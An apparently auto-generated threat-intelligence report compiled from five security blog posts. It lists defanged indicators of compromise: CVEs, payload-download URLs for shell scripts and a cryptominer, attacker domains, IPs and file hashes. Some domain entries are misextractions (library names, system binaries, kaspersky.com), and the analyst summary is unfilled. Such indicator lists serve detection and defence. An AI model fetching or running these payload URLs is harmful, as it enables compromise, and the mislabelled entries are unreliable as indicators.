# Unit42 Blogs - URL Test Run

## 📋 Report Metadata

**Issue:** [#1](https://github.com/apps-dfir/Security-Operations/issues/1)<br>
**Analyst:** Apramey 'Apps' Shurpali<br>
**Generated:** 2026-01-01 02:21:51 UTC<br>
**Sources Processed:** 5<br>
**OCR Enabled:** Yes

## 📚 Sources

1. [From Linear to Complex: An Upgrade in RansomHouse Encryption](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
2. [The HoneyMyte APT now protects malware with a kernel-mode rootkit](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
3. [Exploitation of Critical Vulnerability in React Server Components (Updated December 12)](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
4. [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
5. [01flip: Multi-Platform Ransomware Written in Rust](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)

## 📊 Report Summary

**Total Unique IOCs:** 206<br>
**High Confidence IOCs:** 150<br>
**MITRE ATT&CK Techniques:** 7<br>
**Images with OCR Data:** 17<br>
**Breakdown:** CVEs: 3, URLs: 18, Domains: 95, IPs: 19, SHA256: 54, MD5: 3, Paths: 5, Commands: 9

## Executive Summary (Analyst Fill-In)

### Key Takeaways
- What happened (1-2 bullets)
- Who/what is affected (orgs, sectors, regions)
- Why it matters to us (risk / exposure / priority)

### Initial Assessment
- Confidence level: (low/med/high)
- Recommended actions: (monitor / hunt / block / brief)

## 🔍 Consolidated Indicators of Compromise

> IOCs are deduplicated across sources. Confidence: 🟢 HIGH | 🟡 MEDIUM | 🔴 LOW

### CVEs

- 🟢 `CVE-2019-11580` [[5]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `CVE-2025-55182` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `CVE-2025-66478` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

### URLs

- 🟢 `hxxp://115[.]42[.]60[.]223:61236/slt` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://146[.]88[.]129[.]138:5511/443nb64` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://156[.]234[.]209[.]103:20912/get[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://156[.]234[.]209[.]103:20913/get[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://156[.]234[.]209[.]103:63938/nrCrQ` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://193[.]24[.]123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://193[.]24[.]123[.]68:3001/gfdsgsdfhfsd_ghsfdgsfdgsdfg[.]sh')[.]read` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://193[.]34[.]213[.]150/nuts/bolts` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://31[.]57[.]46[.]28/test[.]sh&&sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://45[.]32[.]158[.]54/5e51aff54626ef7f/x86_64` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://46[.]36[.]37[.]85:12000/sex[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://47[.]84[.]57[.]207/index` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://95[.]169[.]180[.]135:8443/pamssod` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://res[.]qiqigece[.]top/nginx1` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxp://superminecraft[.]net[.]br:3000/sex[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxps://raw[.]githubusercontent[.]com/C3Pool/xmrig_setup/master/setup_c3pool_miner` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxps://raw[.]githubusercontent[.]com/C3Pool/xmrig_setup/master/setup_c3pool_miner[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `hxxps://sup001[.]oss-cn-hongkong[.]aliyuncs[.]com/123/python1[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)

### Domains

- 🟢 `093214[.]xyz` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `MicrosoftOneDrive[.]tlb` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🟢 `System[.]Net` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `account[.]techupinfo` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `api[.]healthylifefeed` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `api[.]medicinefinders` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `api[.]softmatictech` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `api[.]systemsync` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `api[.]technology` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `api[.]widetechno` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `apiv2[.]onlinefieldtech` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `auth[.]onlinefieldtech` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `avocadomechanism[.]com` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🟢 `check[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `cn-hongkong[.]aliyuncs` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `d5[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `financecovers[.]com` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `fn32[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `forum[.]technoforts` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `forum[.]techtg` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `get[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `kaspersky[.]com` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🟢 `keep[.]camdvr` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `kof97[.]lol` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `potherbreference[.]com` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🟢 `proton[.]me` [[5]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `python1[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `raw[.]githubusercontent` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `reactcdn[.]windowserrorapis` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `res[.]qiqigece` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `resolv[.]conf` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `segawon[.]id` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `sex[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `status[.]techupinfo` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `sup001[.]oss` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `superminecraft[.]net` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `system[.]com` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `techpointinfo[.]com` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `test[.]sh` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `urllib[.]request` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `Document[.]pdf` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🔴 `Files[.]txt` [[1]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🔴 `Next[.]js` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `Node[.]js` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `ProjectConfiguration[.]sys` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🔴 `RECOVER-YOUR-FILE[.]TXT` [[5]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🔴 `adfind[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `at[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `bun[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `cmd[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `cscript[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `csvde[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `driverquery[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `dsquery[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `dwampi[.]dll` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🔴 `filemanager-standalone[.]js` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `fltmgr[.]sys` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🔴 `fm[.]js` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `ipconfig[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `jscript[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `klist[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `msasn1[.]dll` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🔴 `mshta[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `nbstat[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `nbtscan[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `net[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `net1[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `netsh[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `netstat[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `netutils[.]dll` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🔴 `nltest[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `node[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `ntdsutil[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `ntoskrnl[.]exe` [[2]](https://securelist.com/honeymyte-kernel-mode-rootkit/118590/)
- 🔴 `ping[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `powershell[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `python[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `query[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `quser[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `qwinsta[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `rundll32[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `segawon[.]txt` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `server[.]js` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `srvcli[.]dll` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🔴 `svchost[.]exe` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🔴 `systeminfo[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `tasklist[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `traceroute[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `vssadmin[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `vssvc[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `wevtutil[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `whoami[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `whois[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `wscript[.]exe` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `wtsapi32[.]dll` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

### IP Addresses

- 🟢 `115[.]42[.]60[.]223` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `140[.]99[.]223[.]178` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `146[.]88[.]129[.]138` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `154[.]89[.]152[.]240` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `156[.]234[.]209[.]103` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `192[.]238[.]202[.]17` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `193[.]24[.]123[.]68` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `193[.]34[.]213[.]150` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `31[.]56[.]27[.]76` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `31[.]57[.]46[.]28` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `38[.]162[.]112[.]141` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `45[.]134[.]174[.]235` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `45[.]32[.]158[.]54` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `46[.]36[.]37[.]85` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `47[.]84[.]57[.]207` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `47[.]84[.]79[.]46` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `72[.]62[.]67[.]33` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `95[.]169[.]180[.]135` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🔴 `127[.]0[.]0[.]7` [[5]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)

### File Hashes

**SHA256:**
- 🟢 `0fe7fcc66726f8f2daed29b807d1da3c531ec004925625855f8889950d0d24d8` [[1]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🟢 `1663d98c259001f1b03f82d0c5bee7cfd3c7623ccb83759c994f9ab845939665` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `18c68a982f91f665effe769f663c51cb0567ea2bfc7fab6a1a40d4fe50fc382b` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `1a3e7b4ee2b2858dbac2d73dd1c52b1ea1d69c6ebb24cc434d1e15e43325b74e` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `1cdd9b0434eb5b06173c7516f99a832dc4614ac10dda171c8eed3272a5e63d20` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `1e31dc074a4ea7f400cb969ea80e8855b5e7486660aab415da17591bc284ac5b` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `1f3bd755de24e00af2dba61f938637d1cc0fbfd6166dba014e665033ad4445c0` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `1f3f0695c7ec63723b2b8e9d50b1838df304821fcb22c7902db1f8248a812035` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `26b3c1269064ba1bf2bfdcf2d3d069e939f0e54fc4189e5a5263a49e17872f2a` [[1]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🟢 `2b0dc27f035ba1417990a21dafb361e083e4ed94a75a1c49dc45690ecf463de4` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `2ca913556efd6c45109fd8358edb18d22a10fb6a36c1ab7b2df7594cd5b0adbc` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `2d71d7e6ffecab8eefa2d6a885bcefe639fca988bdcac99e9b057e61698a1fd6` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `30490ba95c42cefcca1d0328ea740e61c26eaf606a98f68d26c4a519ce918c99` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `33641bfbbdd5a9cd2320c61f65fe446a2226d8a48e3bd3c29e8f916f0592575f` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `3502c9e4896802f069ef9dcdba2a7476e1208ece3cd5ced9f1c4fd32d4d0d768` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `3d445c25752f86c65e03d4ebed6d563d48a22e424ba855001ad2db2290bf564c` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `4a759cbc219bcb3a1f8380a959307b39873fb36a9afd0d57ba0736ad7a02763b` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `4e1f7b48249dd5bf3a857d5d017f0b88c0372749fa156f5456056767c5548345` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `4ff096fbea443778fec6f960bf2b9c84da121e6d63e189aebaaa6397d9aac948` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `55ae00bc8482afd085fd128965b108cca4adb5a3a8a0ee2957d76f33edd5a864` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `62e9a01307bcf85cdaeecafd6efb5be72a622c43a10f06d6d6d3b566b072228d` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `66ab29d2d62548faeaeadaad9dd62818163175872703fda328bb1b4894f5e69e` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `6aad1c36ab9c7c44350ebe3a17178b4fd93c2aa296e2af212ab28d711c0889a3` [[5]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `6bd3d05aef89cd03d6b49b20716775fe92f0cf8a3c2747094404ef98f96e9376` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `739a5199add1d970ba22d69cc10b4c3a13b72136be6d45212429e8f0969af3dc` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `7d25a97be42b357adcc6d7f56ab01111378a3190134aa788b1f04336eb924b53` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `7e5769cd8128033fc933fbf3346fe2eb9c8e9fc6aa683546e9573e7aa01a8b6b` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `7f05bad031d22c2bb4352bf0b6b9ee2ca064a4c0e11a317e6fedc694de37737a` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `8189c708706eb7302d7598aeee8cd6bdb048bf1a6dbe29c59e50f0a39fd53973` [[1]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🟢 `8870bd358d605a5685a5f9f7785b5fee5aebdcb20e4e62153623f764d7366a3c` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `8c44fa9bf68341c61ccaca0a3723945543e2a04d9db712ae50861e3fa6d9cc98` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `9c931f7f7d511108263b0a75f7b9fcbbf9fd67ebcc7cd2e5dcd1266b75053624` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `a17858f40ff506d59b5ee1ba2579da1685345206f2c7d78cb2c9c578a0c4402b` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `a455731133c00fdd2a141bdfba4def34ae58195126f762cdf951056b0ef161d4` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `ac2182dfbf56d58b4d63cde3ad6e7a52fed54e52959e4c82d6fc999f20f8d693` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `ac7027f30514d0c00d9e8b379b5ad8150c9827c827dc7ee54d906fc2585b6bf6` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `b00491dc178a3d4f320951bccb17eb85bfef23e718b4b94eb597c90b5b6e0ba2` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- 🟢 `b38ec4c803a2d84277d9c598bfa5434fb8561ddad0ec38da6f9b8ece8104d787` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `ba41f0c7ea36cefe7bc9827b3cf27308362a4d07a8c97109704df5d209bce191` [[5]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `bc31561c44a36e1305692d0af673bc5406f4a5bb2c3f2ffdb613c09b4e80fa9f` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `bf602b11d99e815e26c88a3a47eb63997d43db8b8c60db06d6fbddf386fd8c4a` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `d36afcfe1ae2c3e6669878e6f9310a04fb6c8af525d17c4ffa8b510459d7dd4d` [[1]](https://unit42.paloaltonetworks.com/ransomhouse-encryption-upgrade/)
- 🟢 `d704541cde64a3eef5c4f80d0d7f96dc96bae8083804c930111024b274557b16` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `d9313f949af339ed9fafb12374600e66b870961eeb9b2b0d4a3172fd1aa34ed0` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `e2d7c8491436411474cef5d3b51116ddecfee68bab1e15081752a54772559879` [[3]](https://unit42.paloaltonetworks.com/cve-2025-55182-react-and-cve-2025-66478-next/)
- 🟢 `e5834b7bdd70ec904470d541713e38fe933e96a4e49f80dbfb25148d9674f957` [[5]](https://unit42.paloaltonetworks.com/new-ransomware-01flip-written-in-rust/)
- 🟢 `e71a292eafe0ca202f646af7027c17faaa969177818caf08569bd77838e93064` [[4]](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
